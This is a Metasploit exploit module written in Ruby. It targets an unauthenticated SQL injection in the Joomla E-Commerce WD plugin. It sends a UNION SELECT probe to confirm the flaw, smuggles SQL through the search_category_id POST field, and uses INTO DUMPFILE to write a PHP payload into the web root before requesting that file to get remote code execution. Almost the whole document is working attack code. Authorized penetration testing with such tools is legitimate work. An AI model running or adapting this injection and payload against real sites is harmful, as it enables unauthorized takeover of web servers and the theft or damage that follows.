##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class MetasploitModule < Msf::Exploit

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla E-Commerce WD Plugin SQL injection",
      'Description'    => %q{
      This module exploits an unauthenticated SQL injection to attempt
      writing a PHP payload to a given path in order to achieve remote code execution.
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'Brandon Perry'
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/35224/']
        ],
      'Arch' => ARCH_PHP,
      'Payload' => {
        'Space' => 262144,
        'DisableNops' => true
      },
      'Targets' => [['Default', {}]],
      'DefaultTarget' => 0,
      'Platform'       => ['php'],
      'Privileged'     => false,
      'DisclosureDate' => "Nov 13 2014"))

      register_options(
      [
        OptString.new('TARGETURI', [ true, 'Relative URI of Joomla installation', '/']),
        OptString.new('FILEPATH', [true, 'The path to the directory to attempt writing to', '/var/www/html/'])
      ], self.class)
  end

  def check
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    sql = "UNION ALL SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},(CASE WHEN (QUARTER(NULL) IS NULL) THEN 1 ELSE 0 END),0x#{right_marker.unpack("H*")[0]})-- "

    res = send_injected_request(sql)

    unless res
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    code = res.body =~ /#{left_marker}1#{right_marker}/ ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
    return code
  end

  def exploit
    filename = Rex::Text.rand_text_alpha(5)
    register_file_for_cleanup(datastore['FILEPATH'] + '/' + filename + '.php')
    write = "UNION ALL SELECT 0x#{payload.encoded.unpack("H*")[0]} INTO DUMPFILE '#{datastore['FILEPATH']}/#{filename}.php'-- "

    send_injected_request(write)

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, filename + '.php')
    })

  end

  def send_injected_request(str)
    get = {
      'option' => 'com_ecommercewd',
      'controller' => 'products',
      'task' => 'displayproducts'
    }

    post = {
      'product_id' => '',
      'product_count' => '',
      'product_parameters_json' => '',
      'search_name' => '',
      'search_category_id' => '-1) ' + str,
      'filter_filters_opened' => '1',
      'filter_manufacturer_ids' => '1',
      'filter_price_from' => '',
      'filter_price_to' => '',
      'filter_date_added_range' => '0',
      'filter_minimum_rating' => '3',
      'filter_tags' => '',
      'arrangement' => 'thumbs',
      'sort_by' => '',
      'sort_order' => 'asc',
      'paginition_limit_start' => '0',
      'paginiation_limit' => '12'
    }

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => get,
      'vars_post' => post
    })
  end
end

